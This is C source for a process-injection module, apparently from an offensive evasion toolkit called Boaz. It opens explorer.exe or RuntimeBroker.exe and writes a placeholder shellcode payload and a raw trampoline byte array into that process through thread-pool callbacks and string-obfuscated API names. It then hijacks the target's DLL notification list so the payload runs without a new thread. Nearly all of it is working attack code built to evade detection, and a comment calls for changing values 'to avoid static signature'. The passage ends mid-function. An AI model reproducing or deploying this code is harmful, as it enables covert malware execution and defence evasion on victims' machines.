/**
T1055 Process Injection
Custom Stack PI (remote) + Threadless DLL Notification Execution
Tributes: 
https://shorsec.io/blog/dll-notification-injection/

# Author: thomas XM
# Date 2023
#
# This file is part of the Boaz tool
# Copyright (c) 2019-2024 Thomas M
# Licensed under the GPLv3 or later.
#
**/
/***

*/
#include <windows.h>
#include <stdio.h>
// nt.h has manually defined structures we need from winternl.h
// #include <winternl.h>
// headers requried for DLL notification implementations: 
#include <tlhelp32.h>
#include "nt.h"
#include <stddef.h>  // Ensure we have included the header that defines offsetof



typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

//define SimpleSleep
void SimpleSleep(DWORD dwMilliseconds);


typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtWriteVirtualMemory;      // pointer to NtWriteVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID address;                       // PVOID BaseAddress - rdx
    PVOID buffer;                        // PVOID Buffer - r8
    SIZE_T size;                         // SIZE_T NumberOfBytesToWrite - r9
    ULONG bytesWritten;
} NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;


extern "C" {
    VOID CALLBACK IWillBeBack(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
}


void *mcopy(void* dest, const void* src, size_t n){
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (n--)
        *d++ = *s++;
    return dest;
}


// BOOL IsSystem64Bit() {
//     HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
//     if (!hKernel32) return FALSE;

//     PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
//     if (!pGetNativeSystemInfo) {
//         FreeLibrary(hKernel32);
//         return FALSE;
//     }

//     BOOL bIsWow64 = FALSE;
//     SYSTEM_INFO si = {0};
//     pGetNativeSystemInfo(&si);
//     if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
//         bIsWow64 = TRUE;
//     }

//     FreeLibrary(hKernel32);
//     return bIsWow64;
// }

/// Definitions for DLL notification: 

int FindTarget(const char* procname) {
    WCHAR wideProcName[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, procname, -1, wideProcName, MAX_PATH);

    HANDLE hProcSnap;
    PROCESSENTRY32W pe32; // Using PROCESSENTRY32W for Unicode compatibility

    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32W); // Make sure to use the correct structure size for PROCESSENTRY32W

    if (!Process32FirstW(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32NextW(hProcSnap, &pe32)) {
        if (lstrcmpiW(wideProcName, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    printf("[+] Remote PID: %i\n", pid);
    return pid;
}


BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}

// Our dummy callback function
// used to get the head of the LdrpDllNotificationList 
VOID DummyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
{
    return;
}

// Get LdrpDllNotificationList head address
PLIST_ENTRY GetDllNotificationListHead() {
    PLIST_ENTRY head = 0;

    // Get handle of ntdll
    HMODULE hNtdll = GetModuleHandleA("NTDLL.dll");

    if (hNtdll != NULL) {

        // find LdrRegisterDllNotification function
        _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(hNtdll, "LdrRegisterDllNotification");

        // find LdrUnregisterDllNotification function
        _LdrUnregisterDllNotification pLdrUnregisterDllNotification = (_LdrUnregisterDllNotification)GetProcAddress(hNtdll, "LdrUnregisterDllNotification");

        // Register our dummy callback function as a DLL Notification Callback
        PVOID cookie;
        NTSTATUS status = pLdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)DummyCallback, NULL, &cookie);
        if (status == 0) {
            printf("[+] Successfully registered dummy callback\n");

            // Cookie is the last callback registered so its Flink holds the head of the list.
            head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)->List.Flink;
            printf("[+] Found LdrpDllNotificationList head: 0x%p\n", head);

            // Unregister our dummy callback function
            status = pLdrUnregisterDllNotification(cookie);
            if (status == 0) {
                printf("[+] Successfully unregistered dummy callback\n");
            }
        }
    }

    return head;
}

// Remove our callback entry from the DLL Notification Callback List, thus when our magiccode execute any
// functions that requires dynamically loaded DLLs, it will not be called recursively.
// Note that 0x1122334455667788 are just place holders... you should replace them with the actual address
unsigned char restore[] = {
    0x41, 0x56,														// push r14
    0x49, 0xBE, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,		// move r14, 0x1122334455667788
    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,						// mov dword [r14], 0x11223344
    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11, 				// mov dword [r14+4], 0x11223344
    0x49, 0xBE, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,		// move r14, 0x1122334455667788
    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,						// mov dword [r14], 0x11223344
    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11, 				// mov dword [r14+4], 0x11223344
    0x41, 0x5e,														// pop r14
};


unsigned char trampoline[] = { 0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xe8, 0xf, 0x0, 0x0, 0x0, 0x48, 0x89, 0xf4, 0x5e, 0xc3, 0x66, 0x2e, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x55, 0xb9, 0xf0, 0x1d, 0xd3, 0xad, 0x41, 0x54, 0x57, 0x56, 0x53, 0x31, 0xdb, 0x48, 0x83, 0xec, 0x30, 0xe8, 0xf9, 0x0, 0x0, 0x0, 0xb9, 0x53, 0x17, 0xe6, 0x70, 0x49, 0x89, 0xc5, 0xe8, 0xec, 0x0, 0x0, 0x0, 0x49, 0x89, 0xc4, 0x4d, 0x85, 0xed, 0x74, 0x10, 0xba, 0xda, 0xb3, 0xf1, 0xd, 0x4c, 0x89, 0xe9, 0xe8, 0x28, 0x1, 0x0, 0x0, 0x48, 0x89, 0xc3, 0x4d, 0x85, 0xe4, 0x74, 0x32, 0x4c, 0x89, 0xe1, 0xba, 0x37, 0x8c, 0xc5, 0x3f, 0xe8, 0x13, 0x1, 0x0, 0x0, 0x4c, 0x89, 0xe1, 0xba, 0xb2, 0x5a, 0x91, 0x4d, 0x48, 0x89, 0xc7, 0xe8, 0x3, 0x1, 0x0, 0x0, 0x4c, 0x89, 0xe1, 0xba, 0x4d, 0xff, 0xa9, 0x27, 0x48, 0x89, 0xc6, 0xe8, 0xf3, 0x0, 0x0, 0x0, 0x49, 0x89, 0xc4, 0xeb, 0x7, 0x45, 0x31, 0xe4, 0x31, 0xf6, 0x31, 0xff, 0x45, 0x31, 0xc9, 0x45, 0x31, 0xc0, 0x48, 0x8d, 0x4c, 0x24, 0x28, 0x48, 0xba, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x48, 0xc7, 0x44, 0x24, 0x28, 0x0, 0x0, 0x0, 0x0, 0xff, 0xd7, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0xff, 0xd6, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0x41, 0xff, 0xd4, 0xba, 0x0, 0x10, 0x0, 0x0, 0x48, 0x83, 0xc9, 0xff, 0xff, 0xd3, 0x48, 0x83, 0xc4, 0x30, 0x5b, 0x5e, 0x5f, 0x41, 0x5c, 0x41, 0x5d, 0xc3, 0x49, 0x89, 0xd1, 0x49, 0x89, 0xc8, 0xba, 0x5, 0x15, 0x0, 0x0, 0x8a, 0x1, 0x4d, 0x85, 0xc9, 0x75, 0x6, 0x84, 0xc0, 0x75, 0x16, 0xeb, 0x2f, 0x41, 0x89, 0xca, 0x45, 0x29, 0xc2, 0x4d, 0x39, 0xca, 0x73, 0x24, 0x84, 0xc0, 0x75, 0x5, 0x48, 0xff, 0xc1, 0xeb, 0x7, 0x3c, 0x60, 0x76, 0x3, 0x83, 0xe8, 0x20, 0x41, 0x89, 0xd2, 0xf, 0xb6, 0xc0, 0x48, 0xff, 0xc1, 0x41, 0xc1, 0xe2, 0x5, 0x44, 0x1, 0xd0, 0x1, 0xc2, 0xeb, 0xc4, 0x89, 0xd0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x57, 0x56, 0x48, 0x89, 0xce, 0x53, 0x48, 0x83, 0xec, 0x20, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x60, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x78, 0x20, 0x48, 0x89, 0xfb, 0xf, 0xb7, 0x53, 0x48, 0x48, 0x8b, 0x4b, 0x50, 0xe8, 0x85, 0xff, 0xff, 0xff, 0x89, 0xc0, 0x48, 0x39, 0xf0, 0x75, 0x6, 0x48, 0x8b, 0x43, 0x20, 0xeb, 0x11, 0x48, 0x8b, 0x1b, 0x48, 0x85, 0xdb, 0x74, 0x5, 0x48, 0x39, 0xdf, 0x75, 0xd9, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x5e, 0x5f, 0xc3, 0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xd6, 0x41, 0x55, 0x41, 0x54, 0x55, 0x31, 0xed, 0x57, 0x56, 0x53, 0x48, 0x89, 0xcb, 0x48, 0x83, 0xec, 0x28, 0x48, 0x63, 0x41, 0x3c, 0x8b, 0xbc, 0x8, 0x88, 0x0, 0x0, 0x0, 0x48, 0x1, 0xcf, 0x44, 0x8b, 0x7f, 0x20, 0x44, 0x8b, 0x67, 0x1c, 0x44, 0x8b, 0x6f, 0x24, 0x49, 0x1, 0xcf, 0x39, 0x6f, 0x18, 0x76, 0x31, 0x89, 0xee, 0x31, 0xd2, 0x41, 0x8b, 0xc, 0xb7, 0x48, 0x1, 0xd9, 0xe8, 0x15, 0xff, 0xff, 0xff, 0x4c, 0x39, 0xf0, 0x75, 0x18, 0x48, 0x1, 0xf6, 0x48, 0x1, 0xde, 0x42, 0xf, 0xb7, 0x4, 0x2e, 0x48, 0x8d, 0x4, 0x83, 0x42, 0x8b, 0x4, 0x20, 0x48, 0x1, 0xd8, 0xeb, 0x4, 0xff, 0xc5, 0xeb, 0xca, 0x48, 0x83, 0xc4, 0x28, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3, 0x90, 0x90, 0x90, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x58, 0x48, 0x83, 0xe8, 0x5, 0xc3, 0xf, 0x1f, 0x44, 0x0 };

// Print LdrpDllNotificationList of a remote process
void PrintDllNotificationList(HANDLE hProc, LPVOID remoteHeadAddress) {
    printf("\n");
    printf("[+] Remote DLL Notification Block List:\n");

    // Allocate memory buffer for LDR_DLL_NOTIFICATION_ENTRY
    BYTE* entry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    // Read the head entry from the remote process
    ReadProcessMemory(hProc, remoteHeadAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    LPVOID currentEntryAddress = remoteHeadAddress;
    do {

        // print the addresses of the LDR_DLL_NOTIFICATION_ENTRY and its callback function
        printf("    0x%p -> 0x%p\n", currentEntryAddress, ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->Callback);

        // Get the address of the next callback in the list
        currentEntryAddress = ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->List.Flink;

        // Read the next callback in the list
        ReadProcessMemory(hProc, currentEntryAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    } while ((PLIST_ENTRY)currentEntryAddress != remoteHeadAddress); // Stop when we reach the head of the list again

    free(entry);

    printf("\n");
}



int main(int argc, char *argv[]) {


    unsigned char magiccode[] = ####SHELLCODE####;


    // STARTUPINFO si;
    // PROCESS_INFORMATION pi;
    // ZeroMemory(&si, sizeof(si));
    // si.cb = sizeof(si);
    // ZeroMemory(&pi, sizeof(pi));
    // DWORD pid = 0;
    // char notepadPath[256] = {0};  // Initialize the buffer

    // //check if pid is provided as argument: 
    // if (argc > 1) {
    //     pid = atoi(argv[1]);
    //     printf("[+] PID provided: %d\n", pid);
    //     // get pi information from pid:
    //     pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    //     pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
    // } else {
    //     printf("[-] PID not provided\n");
    //     // Determine the correct Notepad path based on system architecture
    //     if (IsSystem64Bit()) {
    //         strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
    //     } else {
    //         strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
    //     }

    //     // Attempt to create a process with Notepad
    //     BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    //     if (!success) {
    //         MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
    //         return 1; // Exit if unable to start Notepad
    //     }
    //     printf("Notepad started with default settings.\n");
    //     pid = pi.dwProcessId;  
    //     printf("[+] notepad PID: %d\n", pid);      
    // }

    // Get local LdrpDllNotificationList head address
    LPVOID headAddress = (LPVOID)GetDllNotificationListHead();
    printf("[+] LdrpDllNotificationList head address: 0x%p\n", headAddress);

    // Open handle to remote process
    HANDLE hProc = NULL;
    DWORD pid = FindTarget("explorer.exe");

    if (pid != 0) {
        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        //use printf instead og std::cout:
        printf("[+] Opened explorer.exe with handle: %d\n", hProc); //use
    } else {
        pid = FindTarget("RuntimeBroker.exe");
        if (pid != 0) {
            hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            printf("[+] Opened RuntimeBroker.exe with handle: %d\n", hProc);
        } else {
            printf("[-] Could not find explorer.exe or RuntimeBroker.exe\n");
        }
    }

    // Print the remote Dll Notification List
    PrintDllNotificationList(hProc, headAddress);

    //////////////////////

    //print the first 8 bytes of the magiccode and the last 8 bytes:
    printf("First 8 bytes magiccode: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[0], magiccode[1], magiccode[2], magiccode[3], magiccode[4], magiccode[5], magiccode[6], magiccode[7]);
    printf("Last 8 bytes magiccode: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[sizeof(magiccode) - 8], magiccode[sizeof(magiccode) - 7], magiccode[sizeof(magiccode) - 6], magiccode[sizeof(magiccode) - 5], magiccode[sizeof(magiccode) - 4], magiccode[sizeof(magiccode) - 3], magiccode[sizeof(magiccode) - 2], magiccode[sizeof(magiccode) - 1]);
    

    // Allocate memory for our trampoline + restore prologue + magiccode in the remote process
    LPVOID trampolineEx = NULL;
    SIZE_T allocatedsize = sizeof(trampoline) + sizeof(restore) + sizeof(magiccode);
	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
	const char NtAllocateFuture[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), NtAllocateFuture);
    ntAllocateVirtualMemoryArgs.hProcess = hProc;
    ntAllocateVirtualMemoryArgs.address = &trampolineEx;
    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;

    const char TpAlloc[] = { 'T', 'p', 'A', 'l', 'l', 'o', 'c', 'W', 'o', 'r', 'k', 0 };
    const char TpPost[] = { 'T', 'p', 'P', 'o', 's', 't', 'W', 'o', 'r', 'k', 0 };
    const char TpRelease[] = { 'T', 'p', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'W', 'o', 'r', 'k', 0 };
    /// Set workers
    FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA(libName), TpAlloc); 
    FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA(libName), TpPost);  //allocated worker for thread exe
    FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA(libName), TpRelease); //clean up thread

    PTP_WORK WorkReturn = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)IWillBeBack, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    // getchar();
    printf("[+] Allocated memory for restore trampoline + prologue + magiccode in remote process\n");
    printf("[+] Trampoline address in remote process: 0x%p\n", trampolineEx);
    printf("[-] Allocated size: %lu\n", allocatedsize);
    printf("[+] MagicCode size: %lu\n", sizeof(magiccode));

    // Insert the restore prologue into trampoline
    // Offset the size of the trampoline to get the restore prologue address
    LPVOID restoreEx = (BYTE*)trampolineEx + sizeof(trampoline);
    printf("[+] Restore prologue address in remote process: 0x%p\n", restoreEx);

    // Offset the size of the trampoline and restore prologue to get the magiccode address
    LPVOID magiccodeEx = (BYTE*)trampolineEx + sizeof(trampoline) + sizeof(restore);
    printf("[+] magiccode address in remote process: 0x%p\n", magiccodeEx);

    // Find our restoreEx place holder in the trampoline magiccode
    // TODO: change the place holder value to avoid static signature
    LPVOID restoreExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, sizeof(trampoline), (PBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", (PCHAR)"xxxxxxxx");
    // LPVOID restoreExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, sizeof(trampoline), (PBYTE)"\x77\x77\x77\x77\x77\x77\x77\x77", (PCHAR)"xxxxxxxx");


    // Overwrite our restoreEx place holder with the address of our restore prologue
    mcopy(restoreExInTrampoline, &restoreEx, 8);
    BOOL result = FlushInstructionCache(hProc, NULL, 0);
    if(result) {
        printf("[+] FlushInstructionCache success\n");
    } else {
        DWORD error = GetLastError();
        printf("[-] FlushInstructionCache failed with error code %lu\n", error);
    }
    //// Write trampoline to remote process:

	///Write process memory: 

    ULONG bytesWritten = 0;
    NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), "NtWriteVirtualMemory");
    ntWriteVirtualMemoryArgs.hProcess = hProc;
    ntWriteVirtualMemoryArgs.address = trampolineEx;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)trampoline;
    ntWriteVirtualMemoryArgs.size = sizeof(trampoline);
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // // / Set workers

    PTP_WORK WorkReturn2 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
    printf("Bytes written: %lu\n", bytesWritten);
    // Call write memory again: 
    ntWriteVirtualMemoryArgs.address = magiccodeEx;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)magiccode;
    ntWriteVirtualMemoryArgs.size = sizeof(magiccode);
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // // / Set workers

    WorkReturn2 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL); //pass WriteProcessMemoryCustom as callback function
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2); //allocated worker for thread exe
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2); //clean up exe thread
    // printf("Bytes written: %lu\n", bytesWritten);

    // Write the trampoline magiccode to the remote process
    // WriteProcessMemory(hProc, trampolineEx, trampoline, sizeof(trampoline), nullptr);
    // printf("[+] trampoline has been written to remote process: 0x%p\n", trampolineEx);

    // // Write the magiccode to the remote process
    // WriteProcessMemory(hProc, magiccodeEx, magiccode, sizeof(magiccode), nullptr);
    // printf("[+] magiccode has been written to remote process: 0x%p\n", magiccodeEx);

    // Create a new LDR_DLL_NOTIFICATION_ENTRY
    LDR_DLL_NOTIFICATION_ENTRY newEntry = {};
    newEntry.Context = NULL;

    // Set the Callback attribute to point to our trampoline
    newEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)trampolineEx;

    // We want our new entry to be the first in the list 
    // The code follows inject our new entry in between the head of the list and the original first entry by
    // replace their Flink and Blink pointers with our new entry's address
    // so its List.Blink attribute should point to the head of the list
    newEntry.List.Blink = (PLIST_ENTRY)headAddress;

    size_t sizeOfEntry = sizeof(LDR_DLL_NOTIFICATION_ENTRY);
    // Allocate memory buffer for LDR_DLL_NOTIFICATION_ENTRY
    BYTE* remoteHeadEntry = (BYTE*)malloc(sizeOfEntry);

    // Read the head entry from the remote process
    ReadProcessMemory(hProc, headAddress, remoteHeadEntry, sizeOfEntry, nullptr);

    // Set the new entry's List.Flink attribute to point to the original first entry in the list
    newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;

    // Allocate memory for our new entry
    // LPVOID newEntryAddress = VirtualAllocEx(hProc, 0, sizeof(LDR_DLL_NOTIFICATION_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    LPVOID newEntryAddress = NULL;
    ntAllocateVirtualMemoryArgs.address = &newEntryAddress;
    ntAllocateVirtualMemoryArgs.size = &sizeOfEntry;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;

    WorkReturn = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)IWillBeBack, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    printf("[+] Allocated memory for new entry in remote process: 0x%p\n", newEntryAddress);

    // Write our new entry to the remote process
    // WriteProcessMemory(hProc, (BYTE*)newEntryAddress, &newEntry, sizeOfEntry, nullptr);
    // Call write memory again: 
    ntWriteVirtualMemoryArgs.address = (BYTE*)newEntryAddress;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)&newEntry;
    ntWriteVirtualMemoryArgs.size = sizeOfEntry;
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // // / Set workers

    WorkReturn2 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
    printf("[+] New entry has been written to remote process: 0x%p\n", newEntryAddress);

    // Calculate the addresses we need to overwrite with our new entry's address
    // The previous entry's Flink (head) and the next entry's Blink (original 1st entry)
    LPVOID previousEntryFlink = (LPVOID)((BYTE*)headAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));
    LPVOID nextEntryBlink = (LPVOID)((BYTE*)((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Blink));

    // buffer for the original values we are going to overwrite
    unsigned char originalValue[8] = {};

    // Read the original value of the previous entry's Flink (head)
    ReadProcessMemory(hProc, previousEntryFlink, &originalValue, 8, nullptr);
    mcopy(&restore[4], &previousEntryFlink, 8); // Set address to restore for previous entry's Flink (head) 0x1122334455667788
    mcopy(&restore[15], &originalValue[0], 4); // Set the value to restore (1st half of value) 0x11223344
    mcopy(&restore[23], &originalValue[4], 4); // Set the value to restore (2nd half of value) 0x11223344

    // Read the original value the next entry's Blink (original 1st entry)
    ReadProcessMemory(hProc, nextEntryBlink, &originalValue, 8, nullptr);
    mcopy(&restore[29], &nextEntryBlink, 8); // Set address to restore for next entry's Blink (original 1st entry)
    mcopy(&restore[40], &originalValue[0], 4); // Set the value to restore (1st half of value)
    mcopy(&restore[48], &originalValue[4], 4); // Set the value to restore (2nd half of value)
    result = FlushInstructionCache(hProc, NULL, 0);
    if(result) {
        printf("[+] FlushInstructionCache success\n");
    } else {
        DWORD error = GetLastError();
        printf("[-] FlushInstructionCache failed with error code %lu\n", error);
    }
    // Write the restore prologue to the remote process
    // WriteProcessMemory(hProc, restoreEx, restore, sizeof(restore), nullptr);
    // Call write memory again: 
    ntWriteVirtualMemoryArgs.address = restoreEx;
    ntWriteVirtualMemoryArgs.buffer = restore;
    ntWriteVirtualMemoryArgs.size = sizeof(restore);
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // // / Set workers

    WorkReturn2 = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
    printf("[+] Restore prologue has been written to remote process: 0x%p\n", restoreEx);

    // Overwrite the previous entry's Flink (head) with our new entry's address
    // WriteProcessMemory(hProc, previousEntryFlink, &newEntryAddress, 8, nullptr);
    // Call write memory again: 
    ntWriteVirtualMemoryArgs.address = previousEntryFlink;
    ntWriteVirtualMemoryArgs.buffer = &newEntryAddress;
    ntWriteVirtualMemoryArgs.size = 8;
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;
    WorkReturn2 = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);


    // Overwrite the next entry's Blink (original 1st entry) with our new entry's address
    // WriteProcessMemory(hProc, nextEntryBlink, &newEntryAddress, 8, nullptr);
    //print the value of nextEntryBlink and previousEntryFlink:
    printf("[*] nextEntryBlink: %p\n", nextEntryBlink);
    printf("[*] previousEntryFlink: %p\n", previousEntryFlink);
    // Call write memory again: 
    ntWriteVirtualMemoryArgs.address = nextEntryBlink;
    ntWriteVirtualMemoryArgs.buffer = &newEntryAddress;
    WorkReturn2 = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);

    printf("[+] LdrpDllNotificationList has been modified.\n");
    printf("[+] Our new entry has been inserted.\n");

    // Print the remote Dll Notification List
    PrintDllNotificationList(hProc, headAddress);

    //Completed. 
    printf("[+] Good night.\n");
    SimpleSleep(15000000);
    getchar();
    return 0;
}


void SimpleSleep(DWORD dwMilliseconds)
{
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Create an unsignaled event
